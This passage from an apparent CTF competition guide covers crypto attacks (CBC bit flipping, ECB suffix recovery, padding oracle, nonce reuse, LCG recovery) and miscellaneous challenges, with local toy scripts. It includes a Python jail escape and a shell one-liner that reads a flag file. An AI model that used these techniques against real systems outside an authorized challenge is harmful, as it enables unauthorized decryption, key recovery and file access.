+<a id="07-cryptography--cbc-bit-flipping-without-an-aes-dependency"></a>
+
+### CBC bit flipping without an AES dependency
+
+The relation is `P_i = D(C_i) XOR C_(i-1)`. Changing the previous block by `old XOR wanted` changes the targeted plaintext bytes. The previous plaintext block is usually corrupted; changing the IV targets the first block without that side effect.
+
+Save as `cbc_relation.py`:
+
+```python
+def xor(a, b):
+    assert len(a) == len(b)
+    return bytes(x ^ y for x, y in zip(a, b))
+
+# A fixed hypothetical decrypted block D(C1), not an AES implementation.
+intermediate = bytes(range(16))
+original = b'admin=0;uid=1000'
+desired = b'admin=1;uid=1000'
+iv = xor(intermediate, original)
+modified_iv = xor(iv, xor(original, desired))
+assert xor(intermediate, iv) == original
+assert xor(intermediate, modified_iv) == desired
+print(xor(intermediate, modified_iv))
+```
+
+Expected output contains `admin=1`. An authenticated ciphertext should be rejected after modification. If a challenge uses a CRC instead of a MAC, analyze that CRC separately; arbitrary CRC updates do not bypass a real authentication tag.
+
+<a id="07-cryptography--ecb-suffix-recovery-runnable-oracle-rehearsal"></a>
+
+### ECB suffix recovery: runnable oracle rehearsal
+
+The following uses a deterministic block transform to demonstrate byte alignment and dictionary matching. It is not AES and is not a cryptographically secure encryption implementation. The same equality logic applies to a deterministic ECB oracle with a fixed unknown suffix.
+
+Save as `ecb_suffix_toy.py`:
+
+```python
+from hashlib import sha256
+
+BLOCK = 16
+secret = b'CTF{ecb_demo}'
+key = b'local toy key'
+
+def oracle(prefix):
+    data = prefix + secret
+    pad = BLOCK - len(data) % BLOCK
+    data += bytes([pad]) * pad
+    return b''.join(sha256(key + data[i:i+BLOCK]).digest()[:BLOCK]
+                    for i in range(0, len(data), BLOCK))
+
+base_length = len(oracle(b''))
+growth = next(i for i in range(1, BLOCK+1)
+              if len(oracle(b'A'*i)) > base_length)
+secret_length = base_length - growth
+known = b''
+for index in range(secret_length):
+    prefix = b'A' * (BLOCK-1-index % BLOCK)
+    block_index = index // BLOCK
+    start = block_index * BLOCK
+    target = oracle(prefix)[start:start+BLOCK]
+    matches = []
+    for candidate in range(256):
+        sample = oracle(prefix + known + bytes([candidate]))
+        if sample[start:start+BLOCK] == target:
+            matches.append(candidate)
+    assert len(matches) == 1
+    known += bytes([matches[0]])
+assert known == secret
+print(known)
+```
+
+Failure usually means a changing key, unknown prefix, randomized encryption, wrong block size, compression, or a query limit. Determine whether the prefix is fixed or changes per request before trying to align it. Do not send the toy loop to a remote service until its oracle model and allowed query budget are established.
+
+<a id="07-cryptography--8-padding-and-error-oracles"></a>
+
+## 8. Padding and error oracles
+
+A CBC padding oracle reveals whether modified plaintext has valid padding. First distinguish padding rejection from authentication rejection, JSON parsing, UTF-8 decoding, or normal application errors. Repeat controls: one noisy error is insufficient.
+
+This complete local simulator recovers a 16-byte intermediate value using only a padding-validity function. Save as `padding_oracle_toy.py`:
+
+```python
+BLOCK = 16
+intermediate = bytes([91, 2, 77, 18, 200, 17, 9, 55, 66, 7, 33, 111, 8, 4, 3, 2])
+plain = b'CTF{oracle_demo}'
+assert len(plain) == BLOCK
+original_previous = bytes(a ^ b for a, b in zip(intermediate, plain))
+queries = 0
+
+def valid_padding(chosen_previous):
+    global queries
+    queries += 1
+    candidate = bytes(a ^ b for a, b in zip(intermediate, chosen_previous))
+    length = candidate[-1]
+    return 1 <= length <= BLOCK and candidate[-length:] == bytes([length])*length
+
+recovered = bytearray(BLOCK)
+for index in range(BLOCK-1, -1, -1):
+    pad = BLOCK-index
+    probe = bytearray(BLOCK)
+    for j in range(index+1, BLOCK):
+        probe[j] = recovered[j] ^ pad
+    found = []
+    for guess in range(256):
+        probe[index] = guess
+        if not valid_padding(probe):
+            continue
+        # Reject accidental padding longer than the intended suffix.
+        if index > 0:
+            probe[index-1] ^= 1
+            still_valid = valid_padding(probe)
+            probe[index-1] ^= 1
+            if not still_valid:
+                continue
+        found.append(guess ^ pad)
+    assert len(found) == 1, (index, found)
+    recovered[index] = found[0]
+
+result = bytes(a ^ b for a, b in zip(recovered, original_previous))
+assert bytes(recovered) == intermediate
+assert result == plain
+print(result, 'queries:', queries)
+```
+
+This simulates one block, not a network exploit. To adapt it, preserve the full protocol framing, determine which block is actually decrypted, and confirm that a MAC is not checked first. False positives at padding length 1 need the second probe shown above. UTF-8 or application-format oracles require different logic.
+
+RSA PKCS#1 v1.5 and OAEP-leading-byte oracles use multiplicative interval narrowing, not CBC byte flipping. Record the exact predicate before using a Bleichenbacher or Manger implementation from approved local crypto-attacks. See the advanced chapter for the distinction.
+
+<a id="07-cryptography--9-hashes-macs-crcs-and-compression"></a>
+
+## 9. Hashes, MACs, CRCs, and compression
+
+Hash length is not an algorithm identifier. Compare source, field names, encoding, salt placement, and known test values. A 32-character hex string might be MD5, a random token, or truncated output from another function.
+
+Length extension applies to constructions such as certain Merkle–Damgård hashes of `secret || message`. It does not apply to HMAC simply because HMAC uses the same hash internally. You need the original digest, original message, a secret-length hypothesis, and an application parser that accepts the required glue padding.
+
+**Kali:** hlextend is listed, but check its installed API locally before use:
+
+```bash
+python3 -c "import hlextend; help(hlextend)"
+```
+
+Start with a toy local verifier and verify the extended digest exactly before querying a challenge. Hash length extension does not decrypt a message and does not recover the secret.
+
+For a custom XOR-aggregate hash or linear MAC, express each known message/signature pair as equations over the correct field. CRC32 is affine for fixed conventions and message lengths; bit order, initial state, and final XOR matter. Compare equal-length messages and verify any proposed correction with the same CRC implementation.
+
+For compression side channels, measure compressed length before encryption noise if the interface permits. Keep secret context and chosen prefix adjacent, repeat samples, and compare candidates of equal input length. Padding, random prefixes, different compression dictionaries, and state resets can hide the signal.
+
+Collision and preimage are different goals. A collision for two chosen files is not a preimage for a fixed digest. A published SHA-1 collision pair does not automatically produce a chosen-prefix collision for an arbitrary challenge document.
+
+<a id="07-cryptography--10-diffiehellman-and-signature-nonces"></a>
+
+## 10. Diffie–Hellman and signature nonces
+
+For finite-field DH, record `p`, generator `g`, both public keys, and whether private keys persist. Check trivial generator values, group order factors, and validation of peer public values.
+
+Save as `dh_toy.py`:
+
+```python
+p, g, alice, bob = 1019, 2, 123, 456
+A, B = pow(g, alice, p), pow(g, bob, p)
+shared_a, shared_b = pow(B, alice, p), pow(A, bob, p)
+assert shared_a == shared_b
+print('shared:', shared_a)
+
+for bad_g in [0, 1, p-1]:
+    possibilities = {pow(bad_g, exponent, p) for exponent in range(1, 12)}
+    print('generator', bad_g, 'public possibilities', sorted(possibilities))
+assert {pow(p-1, exponent, p) for exponent in range(1, 12)} == {1, p-1}
+```
+
+Small-subgroup confinement needs an accepted low-order public value, a persistent secret, and an observable response that distinguishes candidate shared secrets. One oracle output with an ephemeral secret does not accumulate CRT information across sessions.
+
+For DSA/ECDSA, repeated nonce `k` can expose the private key. The modular arithmetic below is common to both signature equations, using a toy subgroup order. It does not generate an elliptic-curve point.
+
+Save as `nonce_reuse.py`:
+
+```python
+n = 1019
+private, nonce, r = 123, 77, 456
+h1, h2 = 100, 200
+s1 = pow(nonce, -1, n) * (h1 + r*private) % n
+s2 = pow(nonce, -1, n) * (h2 + r*private) % n
+recovered_nonce = (h1-h2) * pow(s1-s2, -1, n) % n
+recovered_private = (s1*recovered_nonce-h1) * pow(r, -1, n) % n
+assert recovered_nonce == nonce
+assert recovered_private == private
+assert s1*nonce % n == (h1+r*private) % n
+assert s2*nonce % n == (h2+r*private) % n
+print(recovered_nonce, recovered_private)
+```
+
+Use the subgroup order, not the curve field prime. Match the real message hash truncation. ECDSA low-s normalization may require trying sign variants. Validate the recovered private key against the published public key. Ed25519 uses different encoding and scalar derivation; do not paste ECDSA code into it unchanged.
+
+<a id="07-cryptography--11-predictable-randomness"></a>
+
+## 11. Predictable randomness
+
+Identify the generator and its output transformation. Record how many hidden draws occur between observations. Timestamp seeds, truncated outputs, floating-point conversion, rejection sampling, and modulo reduction change the attack.
+
+<a id="07-cryptography--lcg-recovery-and-backward-stepping"></a>
+
+### LCG recovery and backward stepping
+
+Save as `lcg_recovery.py`:
+
+```python
+from math import gcd
+
+modulus, multiplier, increment = 1009, 65, 17
+states = [123]
+for _ in range(7):
+    states.append((multiplier*states[-1]+increment) % modulus)
+
+d1 = (states[1]-states[0]) % modulus
+d2 = (states[2]-states[1]) % modulus
+assert gcd(d1, modulus) == 1
+a = d2 * pow(d1, -1, modulus) % modulus
+c = (states[1]-a*states[0]) % modulus
+assert (a, c) == (multiplier, increment)
+assert all((a*x+c) % modulus == y for x, y in zip(states, states[1:]))
+previous = (states[1]-c) * pow(a, -1, modulus) % modulus
+assert previous == states[0]
+print('a, c, previous:', a, c, previous)
+
+# Unknown modulus: differences produce multiples of the modulus.
+diffs = [y-x for x, y in zip(states, states[1:])]
+candidate = 0
+for x, y, z in zip(diffs, diffs[1:], diffs[2:]):
+    candidate = gcd(candidate, abs(x*z-y*y))
+assert candidate % modulus == 0
+print('modulus multiple:', candidate)
+```
+
+The GCD may be a multiple of the modulus. Filter candidates using all observations and known bounds. If a difference is not invertible, solve the resulting congruence rather than discarding the case. Truncated outputs need a different model, often constraints or a lattice.
+
+<a id="07-cryptography--time-seeds-and-generator-matching"></a>
+
+### Time seeds and generator matching
+
+Bound the seed window using challenge timestamps; reproduce the exact language/runtime PRNG. Python `random`, libc `rand`, Java's LCG, and browser `Math.random` are not interchangeable. Use a known output sequence to verify the generator before testing a derived key.
+
+For MT19937, enough full consecutive outputs permit state reconstruction after undoing tempering. Python floating outputs combine parts of multiple draws; they are not full 32-bit words. A tool that expects 624 raw words cannot accept decimal floats unchanged.
+
+PCG, xorshift, xoroshiro, and xoshiro have distinguishable state transitions and output scramblers. Read constants and rotation amounts from source. Chaotic maps also depend on floating-point precision; mathematically similar real-valued recurrences can produce different byte streams.
+
+LFSR output is linear only when the observed output is a linear state function. Filtered or combined LFSRs require correlation, algebraic, or constraint techniques. See the advanced chapter for a tested Berlekamp–Massey example.
+
+<a id="07-cryptography--12-a-disciplined-finish"></a>
+
+## 12. A disciplined finish
+
+Check the recovered object in the original equation: re-encrypt plaintext, verify a signature, regenerate observed RNG outputs, or reproduce the tag. Plausible English is not enough. Keep the original bytes, parameters, solver assumptions, and a minimal script with assertions.
+
+If a solver stalls, reduce a toy instance first. Wrong endianness, the wrong modulus, row/column conventions, hidden random draws, noninvertible values, and incorrect oracle definitions are more common than missing brute-force capacity.
+
+The chapter merges the source skill overview, classic/historical ciphers, RSA, DH, PRNG, stream, modern-mode and MAC notes. Specialized topics continue in [Advanced cryptography](#14-advanced-crypto); every crypto source file has a disposition in the coverage manifest.
+
+
+---
+
+<a id="11-miscellaneous"></a>
+
+<a id="11-miscellaneous--miscellaneous-turn-unfamiliar-artifacts-into-a-small-model"></a>
+
+# Miscellaneous: turn unfamiliar artifacts into a small model
+
+**Quick route:** [Short commands](#quickstart--decode-layers) · [Tool strengths and weaknesses](#tool-chooser--miscellaneous). Use this chapter for deeper explanations.
+
+Miscellaneous is one of the PDF's seven competition categories. Its techniques also overlap cryptography, forensics, network analysis, steganography, reversing and web security. Use the artifact and intended operation to choose the next step.
+
+This chapter covers layered encodings, symbolic puzzles, jails, games, audio/RF data, and challenge navigation. Work only on supplied files and assigned challenge services. A challenge container escape is not authorization to modify the organizer's Kali host, workstation, or scoring platform.
+
+<a id="11-miscellaneous--1-platform-map"></a>
+
+## 1. Platform map
+
+| Task | Windows/WSL route | Organizer Kali route |
+|---|---|---|
+| Decode bytes or solve small puzzles | WSL Python 3 standard library | Python 3; check actual interpreter |
+| QR scanning | Listed WSL ZBar | Use a provisioned approved scanner if available; do not assume Windows tools are duplicated |
+| Inspect bytes | Windows HxD or WSL xxd | Listed file, local editor, Python |
+| Audio/spectrogram | Standard-library WAV inspection below | Listed Audacity, Sonic Visualiser, FFmpeg, SoX |
+| Source search | Editor or Python file reads | Listed ripgrep |
+| Constraints | Small Python enumeration; non-AI library under PDF p.5 | Check the interpreter; non-AI libraries may be added under PDF p.5 |
+| Interactive protocol | Python socket to the assigned host | Python socket or listed Ncat |
+
+Check only the dependency needed for the next step. PDF p.5 permits non-AI libraries/dependencies/plugins/packages in both environments; [package setup](#00-tool-rules--non-ai-python-package-checks) preserves named exclusions and the AI/ML ban. Use local decoders and compilers for challenge material.
+
+<a id="11-miscellaneous--2-preserve-the-original-and-inspect-the-representation"></a>
+
+## 2. Preserve the original and inspect the representation
+
+Save as `inspect_bytes.py`, then run `python3 inspect_bytes.py artifact.bin`:
+
+```python
+from pathlib import Path
+from collections import Counter
+import hashlib
+import math
+import sys
+
+data = Path(sys.argv[1]).read_bytes()
+counts = Counter(data)
+entropy = -sum((n/len(data))*math.log2(n/len(data)) for n in counts.values()) if data else 0
+print('bytes:', len(data))
+print('sha256:', hashlib.sha256(data).hexdigest())
+print('first64 hex:', data[:64].hex())
+print('first64 repr:', repr(data[:64]))
+print('byte entropy:', round(entropy, 3))
+```
+
+High entropy suggests compressed, encrypted, or naturally varied data; it does not identify which. A known magic header plus a mismatched extension is more useful than entropy alone. Keep transformed outputs under new names so you can reverse a mistaken branch.
+
+**Kali only:** `file artifact.bin` provides another format hypothesis. Check the actual bytes before trusting an extension or a single tool label.
+
+<a id="11-miscellaneous--3-decode-one-layer-with-a-reason"></a>
+
+## 3. Decode one layer with a reason
+
+| Appearance | Candidate | Confirm before decoding again |
+|---|---|---|
+| Even number of hex digits | Hex bytes | Decoded length halves; inspect header |
+| Alphabet/base64 padding | Base64 | Strict decoder accepts it; inspect bytes |
+| A–Z and 2–7 | Base32 | Padding/case rules match |
+| `%xx` sequences | URL encoding | Distinguish bytes from Unicode text |
+| `\xNN`, `\uNNNN` | Language/string escapes | Decode according to the source language |
+| Two decimal digits per byte | BCD | Each nibble must be 0–9 |
+| Mostly invisible Unicode | Tags/variation selectors/zero-width marks | Print code points, not rendered text |
+| Numeric columns | ASCII, coordinates, or samples | Check ranges and column meaning |
+
+Save as `encoding_toys.py`:
+
+```python
+import base64
+import codecs
+from urllib.parse import unquote_to_bytes
+
+original = b'CTF{layers}'
+encoded = base64.b64encode(original.hex().encode()).decode()
+stage1 = base64.b64decode(encoded, validate=True)
+stage2 = bytes.fromhex(stage1.decode('ascii'))
+assert stage2 == original
+assert unquote_to_bytes('CTF%7Blayers%7D') == original
+assert codecs.decode(codecs.encode('hello', 'rot_13'), 'rot_13') == 'hello'
+print(encoded)
+print(stage1)
+print(stage2)
+```
+
+The order matters: base64 decoding reveals hex text, then hex decoding reveals the flag-shaped toy. Do not feed arbitrary strings to `eval` to “decode” them.
+
+<a id="11-miscellaneous--unicode-tags-and-variation-selectors"></a>
+
+### Unicode tags and variation selectors
+
+Save as `unicode_inspect.py`, then run it on a UTF-8 text file:
+
+```python
+from pathlib import Path
+import sys
+import unicodedata
+
+text = Path(sys.argv[1]).read_text(encoding='utf-8')
+tags = []
+selectors = []
+for position, char in enumerate(text):
+    point = ord(char)
+    if point > 127 or not char.isprintable():
+        print(position, f'U+{point:04X}', unicodedata.name(char, 'UNNAMED'))
+    if 0xE0020 <= point <= 0xE007E:
+        tags.append(point-0xE0000)
+    # A common byte mapping, not a universal Unicode steganography standard.
+    if 0xFE00 <= point <= 0xFE0F:
+        selectors.append(point-0xFE00)
+    elif 0xE0100 <= point <= 0xE01EF:
+        selectors.append(point-0xE0100+16)
+print('tag ASCII:', bytes(tags))
+print('selector bytes:', bytes(selectors))
+```
+
+The tags block and variation-selector mapping are different encodings. Confirm the producer's convention. Zero-width characters can encode bits with a custom alphabet; enumerate symbols first. UTF-16 endianness reversal instead acts on byte pairs, so retain original bytes rather than copying rendered text.
+
+<a id="11-miscellaneous--floats-gray-code-and-bcd"></a>
+
+### Floats, Gray code, and BCD
+
+Save as `numeric_encodings.py`:
+
+```python
+import struct
+
+raw = b'ABCD'
+value = struct.unpack('<f', raw)[0]
+assert struct.pack('<f', value) == raw
+print('float carrying four bytes:', value)
+
+def gray_to_binary(gray):
+    result = gray
+    while gray:
+        gray >>= 1
+        result ^= gray
+    return result
+
+for n in range(256):
+    assert gray_to_binary(n ^ (n >> 1)) == n
+print('Gray-code checks passed')
+
+packed = bytes([0x12, 0x34, 0x56])
+digits = ''
+for byte in packed:
+    hi, lo = byte >> 4, byte & 15
+    assert hi < 10 and lo < 10
+    digits += str(hi) + str(lo)
+assert digits == '123456'
+print(digits)
+```
+
+A decimal float text dump may have rounded away the original bits. IEEE-754 endian choice and width matter. Gray code requires cumulative XOR, not simply reading the Gray-coded integer as binary. Packed BCD is not hexadecimal ASCII.
+
+<a id="11-miscellaneous--4-archive-and-polyglot-puzzles"></a>
+
+## 4. Archive and polyglot puzzles
+
+List contents before extraction. Nested archives may hide a password or next filename in metadata, comments, or a previous layer. Do not blindly recurse without depth, size, and path limits.
+
+**Kali only**, for the listed archive tools:
+
+```bash
+7z l challenge.zip
+unzip -l challenge.zip
+```
+
+For a ZIP on either Python environment, use `zipfile.ZipFile(...).infolist()` to inspect names, compressed/uncompressed lengths, and comments. The web chapter includes a path/symlink inspector. Extract into a fresh challenge directory only after reviewing traversal and total size.
+
+PNG/JAR/ZIP, JPEG/HTML, and WAV/polyglot formats exploit parsers that read different regions. Identify where each parser starts and stops. Appended ZIP data may be visible to an archive reader even when an image viewer ignores it. Do not execute an embedded JAR or program merely because an image opened successfully.
+
+RTF custom tags and SMS PDU payloads need format-aware extraction. Preserve escape sequences, record PDU user-data length and encoding, and reassemble concatenated SMS parts by their reference/sequence fields. Ordinary UTF-8 decoding is not a substitute for GSM 7-bit unpacking.
+
+<a id="11-miscellaneous--5-qr-reconstruction-and-other-visual-alphabets"></a>
+
+## 5. QR reconstruction and other visual alphabets
+
+Determine the module grid, orientation, polarity, and quiet zone. A normal QR has three finder patterns and timing patterns; decorative image pixels are not necessarily modules. Rotate/flip only with a record of each transformation.
+
+For a text file of `0`/`1` module rows, save `grid_to_pgm.py`:
+
+```python
+from pathlib import Path
+import sys
+
+rows = [line.strip() for line in Path(sys.argv[1]).read_text().splitlines() if line.strip()]
+assert rows and all(len(row) == len(rows[0]) for row in rows)
+assert all(set(row) <= {'0', '1'} for row in rows)
+scale, quiet = 8, 4
+height, width = len(rows), len(rows[0])
+out_w, out_h = (width+2*quiet)*scale, (height+2*quiet)*scale
+pixels = bytearray()
+for y in range(out_h):
+    for x in range(out_w):
+        gx, gy = x//scale-quiet, y//scale-quiet
+        dark = 0 <= gx < width and 0 <= gy < height and rows[gy][gx] == '1'
+        pixels.append(0 if dark else 255)
+Path('grid.pgm').write_bytes(f'P5\n{out_w} {out_h}\n255\n'.encode()+pixels)
+print(out_w, out_h, 'grid.pgm')
+```
+
+**Windows WSL**, with listed ZBar:
+
+```bash
+python3 grid_to_pgm.py modules.txt
+zbarimg --raw grid.pgm
+```
+
+Expected output is decoded text, which may itself be another layer. If scanning fails, inspect the grid visually and check whether `1` should be light instead. Do not “repair” random modules until finder/timing patterns and dimensions are consistent.
+
+For tile reassembly, use filenames, directory indexes, edge continuity, and QR structural constraints to reduce permutations. A nonogram may produce the QR grid: solve row/column run constraints, then render with the script above. Hexadecimal Sudoku may similarly map symbols to image modules.
+
+Pigpen, flag semaphore, musical intervals, DTMF, keyboard shifts, and MaxiCode have different symbol systems. Identify the alphabet first. ZBar support is not universal across barcode types; a scanner failure may mean unsupported symbology rather than a damaged image.
+
+<a id="11-miscellaneous--6-audio-inspect-channels-before-interpreting-tones"></a>
+
+## 6. Audio: inspect channels before interpreting tones
+
+**Kali only**, with listed FFmpeg:
+
+```bash
+ffprobe -v error -show_entries stream=codec_name,sample_rate,channels,bits_per_sample -of default=noprint_wrappers=1 audio.wav
+ffmpeg -i audio.wav -lavfi showspectrumpic=s=1600x900:legend=1 spectrum.png
+```
+
+Open the spectrogram and look for text, repeated bursts, paired tones, or frequency shifts. Try Audacity's Spectrogram view if you need to zoom and compare channels. Preserve the original sample rate; resampling can destroy symbol timing.
+
+On Windows WSL, a standard-library WAV inspection works without assuming FFmpeg:
+
+```python
+# Save as wav_info.py; run: python3 wav_info.py audio.wav
+import wave
+import sys
+
+with wave.open(sys.argv[1], 'rb') as wav:
+    print('channels:', wav.getnchannels())
+    print('sample width:', wav.getsampwidth())
+    print('sample rate:', wav.getframerate())
+    print('frames:', wav.getnframes())
+    print('seconds:', wav.getnframes()/wav.getframerate())
+```
+
+The `wave` module handles supported uncompressed WAV variants, not every audio codec. An unsupported-format error means use an available approved decoder, not rename an MP3 to `.wav`.
+
+<a id="11-miscellaneous--morse-bursts-from-one-pcm-channel"></a>
+
+### Morse bursts from one PCM channel
+
+Save as `morse_runs.py`. It prints high/low envelope run lengths; it does not guess a threshold or a Morse alphabet for you.
+
+```python
+import sys
+import wave
+import struct
+import math
+
+filename = sys.argv[1]
+threshold = float(sys.argv[2])  # RMS amplitude, e.g. 1000 for 16-bit PCM
+channel = int(sys.argv[3]) if len(sys.argv) > 3 else 0
+with wave.open(filename, 'rb') as wav:
+    assert wav.getsampwidth() == 2, 'requires 16-bit PCM'
+    count, rate = wav.getnchannels(), wav.getframerate()
+    assert 0 <= channel < count
+    raw = wav.readframes(wav.getnframes())
+samples = struct.unpack('<'+'h'*(len(raw)//2), raw)[channel::count]
+window = max(1, rate//100)  # approximately 10 ms
+states = []
+for start in range(0, len(samples), window):
+    chunk = samples[start:start+window]
+    rms = math.sqrt(sum(x*x for x in chunk)/len(chunk))
+    states.append(rms > threshold)
+runs = []
+for state in states:
+    if runs and runs[-1][0] == state:
+        runs[-1][1] += 1
+    else:
+        runs.append([state, 1])
+for state, length in runs:
+    print('tone' if state else 'gap', round(length*window/rate, 3))
+```
+
+```bash
+python3 morse_runs.py audio.wav 1000 0
+```
+
+Expect short/long tone clusters and several gap clusters. For conventional Morse, dot and dash lengths are roughly 1:3; within-letter, letter, and word gaps are roughly 1:3:7. Choose the basic unit from the run histogram, not a single noisy burst. If both channels differ, run each separately. Continuous music requires band filtering before envelope thresholding.
+
+<a id="11-miscellaneous--dtmf-sstv-and-hidden-sample-bits"></a>
+
+### DTMF, SSTV, and hidden sample bits
+
+DTMF uses one low and one high frequency per key. After decoding digits, repeated presses may represent multi-tap text rather than a telephone number. Compare tone duration and pauses.
+
+SSTV sounds like a long modulated image transmission. The Kali sheet has an `sstv`/PySSTV entry, but package name and decoding CLI capability must be verified with local help; do not assume an encoder package provides the source repository's decoder command. MMSSTV and RX-SSTV are explicitly unapproved. If the provided CLI cannot decode, retain the mode/timing observations and report the limitation.
+
+Sample LSB extraction needs the correct sample width, signedness, endian order, channel, and bit order. Read PCM values rather than the WAV header bytes. Test whether an extracted stream begins with a plausible header; a handful of printable bytes is weak evidence.
+
+<a id="11-miscellaneous--7-rfiq-files-get-units-and-layout-right"></a>
+
+## 7. RF/IQ files: get units and layout right
+
+An IQ file may contain interleaved signed 8-bit, signed 16-bit, or float32 I/Q pairs. Determine the format from the challenge description or generator. A wrong dtype can produce a plausible-looking but meaningless constellation.
+
+Save as `iq_peek.py` for a **little-endian float32 IQ** hypothesis:
+
+```python
+from pathlib import Path
+import struct
+import math
+import sys
+
+raw = Path(sys.argv[1]).read_bytes()
+assert len(raw) % 8 == 0, 'not whole float32 I/Q pairs'
+pairs = list(struct.iter_unpack('<ff', raw[:8*10000]))
+assert pairs and all(math.isfinite(i) and math.isfinite(q) for i, q in pairs)
+power = sum(i*i+q*q for i, q in pairs)/len(pairs)
+print('pairs total:', len(raw)//8)
+print('first five:', pairs[:5])
+print('sampled mean power:', power)
+```
+
+Next establish sample rate, occupied bandwidth, carrier offset, symbol rate, and modulation. With a provisioned non-AI numerical library, plot a short spectrum and constellation locally. For QAM, carrier rotation and timing recovery must precede symbol slicing. Try a known preamble to resolve quadrant ambiguity and bit order.
+
+FFT bins are in cycles per sample until multiplied by the sample rate. A frequency peak in a squared signal is not always the symbol rate; modulation and filtering can produce harmonics. Validate the proposed rate by a stable eye/constellation and repeated frame synchronization.
+
+Manchester coding, whitening, convolutional coding, checksums, and framing may follow demodulation. A valid packet CRC is a much stronger success check than a few recognizable letters.
+
+<a id="11-miscellaneous--8-interactive-protocols-without-losing-synchronization"></a>
+
+## 8. Interactive protocols without losing synchronization
+
+Read the prompt and response framing before automating. A service may use newline-delimited JSON, length prefixes, menus, or multiple phases. TCP reads do not correspond one-to-one with server messages.
+
+Save as `read_prompt.py` and replace the host/port only with the assigned challenge endpoint:
+
+```python
+import socket
+import sys
+
+host, port = sys.argv[1], int(sys.argv[2])
+with socket.create_connection((host, port), timeout=5) as sock:
+    sock.settimeout(5)
+    stream = sock.makefile('rb')
+    line = stream.readline(65537)
+    if len(line) > 65536:
+        raise SystemExit('line exceeds local limit')
+    print(repr(line))
+```
+
+This reads one line and sends nothing. If the prompt has no newline, use a bounded `recv` loop until the observed delimiter instead. Preserve state in one connection when the challenge requires it; reconnecting may reset the secret or invalidate prior observations.
+
+For a timed multi-phase puzzle, implement and test each local solver first, then connect the phases through explicit parsers. Never use a remote response as Python source. Treat a timeout as an unknown state, not automatically a wrong answer.
+
+<a id="11-miscellaneous--9-python-jails-inspect-the-evaluator-then-build-the-primitive"></a>
+
+## 9. Python jails: inspect the evaluator, then build the primitive
+
+Read the supplied jail source. Record the Python version, `eval` versus `exec`, available globals/builtins, input normalization, blacklist/allowlist, AST checks, length limit, output handling, and whether state persists between inputs.
+
+Use small diagnostic expressions, one at a time:
+
+```python
+1+1
+"A"*3
+().__class__
+(1).__class__.__name__
+```
+
+Expected results tell you whether arithmetic, strings, attribute access, and normal Python objects exist. A syntax error, filter rejection, NameError, and runtime exception reveal different stages. Do not assume `eval` accepts statements such as `x=1`; it does not. A walrus expression has separate syntax and scope restrictions.
+
+<a id="11-miscellaneous--a-complete-object-reference-escape-toy"></a>
+
+### A complete object-reference escape toy
+
+Removing `__builtins__` does not make references to powerful Python objects safe. Save as `jail_reference_toy.py`:
+
+```python
+FLAG = 'CTF{function_globals_are_reachable}'
+
+def helper():
+    return 'ordinary helper'
+
+def toy_jail(expression):
+    return eval(expression, {'__builtins__': {}, 'helper': helper}, {})
+
+assert toy_jail('1+1') == 2
+result = toy_jail("helper.__globals__['FLAG']")
+assert result == FLAG
+print(result)
+```
+
+For a real challenge, inspect which function/object is exposed and which globals it retains. If an exposed function's globals contain real builtins and the supplied flag path is `/app/flag.txt`, a corresponding builtins `open` call can read that file. The exact dictionary/module shape and filter rules decide the syntax.
+
+Subclass enumeration is another route, but hard-coded indexes are unreliable across versions and imported modules. Search by class name and verify its attributes in a local reproduction. Decorators, format-field traversal, `__getitem__`, and object lifecycle hooks can create implicit calls only if the jail permits the required syntax and objects.
+
+Unicode identifier normalization occurs during Python parsing; string literals are not normalized in the same way. Encoding comments matter only when source bytes are decoded as a file, not necessarily when an already-decoded input string is passed to `eval`.
+
+<a id="11-miscellaneous--advanced-jail-constraints"></a>
+
+### Advanced jail constraints
+
+| Restriction | Useful starting point | Failure to avoid |
+|---|---|---|
+| No quotes | Existing docstrings, names, or indexed strings | Assuming the same docstring offsets across Python versions |
+| No direct calls | Allowed decorators, indexing, or formatting hooks | Mutating immutable built-in classes |
+| One dot | An already available attribute-access primitive | Presenting a chain containing many dots as a solution |
+| Prime length | Count actual transmitted characters; pad with a permitted comment | Confusing escaped source spelling with received bytes |
+| Length checked before a second read | Trace the second input's validation path | Treating assignment statements as valid `eval` expressions |
+| Audit hooks | Determine Python hook, native hook, and events actually monitored | Assuming private CPython memory offsets are portable |
+| Mastermind/distance oracle | Define exact score and input bounds | Interpreting a different score metric as character equality |
+
+Private-runtime memory corruption and hard-coded `_PyRuntime` offsets are not portable recipes. Keep those source examples as version-specific reverse-engineering leads, and validate in the supplied local binary before attempting anything against a service.
+
+<a id="11-miscellaneous--10-bash-and-restricted-shell-puzzles"></a>
+
+## 10. Bash and restricted-shell puzzles
+
+Find the real shell and input path. A filter before `eval`, a restricted shell mode, a menu wrapper, and a seccomp sandbox impose different constraints. Test quoting and expansion locally with a harmless marker.
+
+```bash
+printf '%s\n' $'\103\124\106'
+printf '%s\n' "$0"
+```
+
+Expected first output: `CTF`. ANSI-C octal quoting creates bytes after the raw-input filter has already seen a different spelling. It helps only if the shell supports that syntax and the necessary characters survive the filter.
+
+For an assigned jail that permits the shell built-in `read` and redirection, a supplied flag path can be read without an external `cat`:
+
+```bash
+while IFS= read -r line; do printf '%s\n' "$line"; done < /app/flag.txt
+```
+
+This assumes that exact challenge file path and permissions. If redirection is filtered or execution happens in another shell, it fails. Closed stdout requires tracing the actual output channel; carriage returns can alter display but do not create file access by themselves.
+
+`HISTFILE`, startup files, environment variables, editor command hooks, and dynamic-loader variables are meaningful only if the wrapper invokes the corresponding feature. Do not set persistent startup variables on the competition workstation to test a challenge theory.
+
+<a id="11-miscellaneous--11-games-virtual-machines-and-finite-state-puzzles"></a>
+
+## 11. Games, virtual machines, and finite-state puzzles
+
+Locate the authoritative state. Browser-rendered scores, local cookies, a WebSocket server, WASM memory, and server databases are different sources of truth. Change a harmless client value and check whether the server accepts the resulting state.
+
+For an unsigned or disclosed-secret Flask session, separate decoding from forging; a readable cookie is not necessarily modifiable. For WebSocket games, compare a normal frame with a controlled changed field. Server-time-only validation and floating-point edge cases require actual server acceptance, not just a changed display.
+
+WASM memory is linear bytes, but compiler layouts and exported functions determine meaningful offsets. Use supplied source and browser DevTools to correlate one known value before patching. Roblox files, PyInstaller bundles, remapped Python opcodes, and memfd-packed binaries belong primarily to reverse engineering; preserve their container/bytecode version and use the approved local tools from that chapter.
+
+<a id="11-miscellaneous--a-shortest-path-toy-you-can-adapt"></a>
+
+### A shortest-path toy you can adapt
+
+Save as `maze_bfs.py`:
+
+```python
+from collections import deque
+
+grid = ['S..#', '.#..', '...E']
+start, goal = (0, 0), (2, 3)
+queue = deque([start])
+previous = {start: None}
+while queue:
+    r, c = queue.popleft()
+    if (r, c) == goal:
+        break
